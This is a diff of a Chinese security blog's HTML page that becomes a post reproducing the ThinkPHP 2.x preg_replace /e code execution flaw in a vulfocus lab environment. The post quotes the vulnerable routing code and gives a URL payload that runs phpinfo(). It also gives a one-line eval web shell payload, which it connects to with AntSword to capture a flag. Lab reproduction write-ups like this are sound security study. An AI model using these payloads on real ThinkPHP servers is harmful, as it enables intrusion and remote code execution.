@@ -20,17 +20,26 @@
     var CONFIG = {"hostname":"hzktester.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="越努力越幸运">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Hzktester&#96;s Blog">
-<meta property="og:url" content="https://hzktester.top/tags/Apache-Shiro/index.html">
+  <meta name="description" content="漏洞详情ThinkPHP 2.x版本中，使用 preg_replace 的 &#x2F;e 模式匹配路由： 1$res &#x3D; preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\&#x2F;]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]&#x3D;&quot;\\2&quot;;&#39;, imp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP 2.x 任意代码执行漏洞复现">
+<meta property="og:url" content="https://hzktester.top/2020/09/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%202.x%20%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="Hzktester&#96;s Blog">
-<meta property="og:description" content="越努力越幸运">
+<meta property="og:description" content="漏洞详情ThinkPHP 2.x版本中，使用 preg_replace 的 &#x2F;e 模式匹配路由： 1$res &#x3D; preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\&#x2F;]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]&#x3D;&quot;\\2&quot;;&#39;, imp">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092801.png">
+<meta property="og:image" content="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092802.png">
+<meta property="og:image" content="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092803.png">
+<meta property="og:image" content="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092804.png">
+<meta property="og:image" content="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092805.png">
+<meta property="article:published_time" content="2020-09-28T01:44:00.000Z">
+<meta property="article:modified_time" content="2020-09-28T01:44:55.995Z">
 <meta property="article:author" content="hzktester">
+<meta property="article:tag" content="ThinkPHP">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092801.png">
 
-<link rel="canonical" href="https://hzktester.top/tags/Apache-Shiro/">
+<link rel="canonical" href="https://hzktester.top/2020/09/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%202.x%20%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
 
 
 <script id="page-configurations">
@@ -38,12 +47,12 @@
   CONFIG.page = {
     sidebar: "",
     isHome : false,
-    isPost : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>标签: Apache Shiro | Hzktester`s Blog</title>
+  <title>ThinkPHP 2.x 任意代码执行漏洞复现 | Hzktester`s Blog</title>
   
 
 
@@ -187,51 +196,143 @@
         <div class="content-wrap">
           
 
-          <div class="content tag">
+          <div class="content post posts-expand">
             
 
+    
   
   
-  
-  <div class="post-block">
-    <div class="posts-collapse">
-      <div class="collection-title">
-        <h2 class="collection-header">Apache Shiro
-          <small>标签</small>
-        </h2>
-      </div>
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hzktester.top/2020/09/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%202.x%20%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="hzktester">
+      <meta itemprop="description" content="越努力越幸运">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hzktester`s Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ThinkPHP 2.x 任意代码执行漏洞复现
+        </h1>
+
+        <div class="post-meta">
+			
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-09-28 09:44:00 / 修改时间：09:44:55" itemprop="dateCreated datePublished" datetime="2020-09-28T09:44:00+08:00">2020-09-28</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" style="display: inline;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>527</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-    <div class="collection-year">
-      <span class="collection-header">2020</span>
+        <h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>ThinkPHP 2.x版本中，使用 <strong>preg_replace</strong> 的 <strong>/e</strong> 模式匹配路由：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res &#x3D; preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\&#x2F;]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]&#x3D;&quot;\\2&quot;;&#39;, implode($depr,$paths));</span><br></pre></td></tr></table></figure>
+<p>导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。</p>
+<p>ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用vulfocous启动漏洞环境</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092801.png" alt="image"></p>
+<p>打开就是ThinkPHP的默认页面</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092802.png" alt="image"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问 <strong><a target="_blank" rel="noopener" href="http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D">http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D</a></strong> 即可执行<strong>phpinfo()</strong>:</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092803.png" alt="image"></p>
+<p>然后接入一句话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;xxx&#x2F;$&#123;$&#123;@eval($_POST[1])&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>使用蚁剑连接</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092804.png" alt="image"></p>
+<p>拿到flag</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092805.png" alt="image"></p>
+
     </div>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+    
+    
+    
+        
 
-      <div class="post-meta">
-        <time itemprop="dateCreated"
-              datetime="2020-08-06T15:22:00+08:00"
-              content="2020-08-06">
-          08-06
-        </time>
-      </div>
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>hzktester
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://hzktester.top/2020/09/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%202.x%20%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="ThinkPHP 2.x 任意代码执行漏洞复现">https://hzktester.top/2020/09/28/漏洞复现/ThinkPHP 2.x 任意代码执行漏洞复现/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
 
-      <div class="post-title">
-          <a class="post-title-link" href="/2020/08/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%20rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88Shiro-550%EF%BC%89/" itemprop="url">
-            <span itemprop="name">Shiro rememberMe反序列化漏洞复现过程（Shiro-550）</span>
-          </a>
-      </div>
 
-    </header>
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ThinkPHP/" rel="tag"><i class="fa fa-tag"></i> ThinkPHP</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/09/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ThinkPHP%205.x%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CNVD-2018-24942%EF%BC%89/" rel="prev" title="ThinkPHP5 远程代码执行漏洞复现（CNVD-2018-24942）">
+      <i class="fa fa-chevron-left"></i> ThinkPHP5 远程代码执行漏洞复现（CNVD-2018-24942）
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
   </article>
-
-    </div>
-  </div>
   
   
-  
-
   
 
 
@@ -284,6 +385,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85"><span class="nav-number">1.</span> <span class="nav-text">漏洞详情</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">3.</span> <span class="nav-text">漏洞复现</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
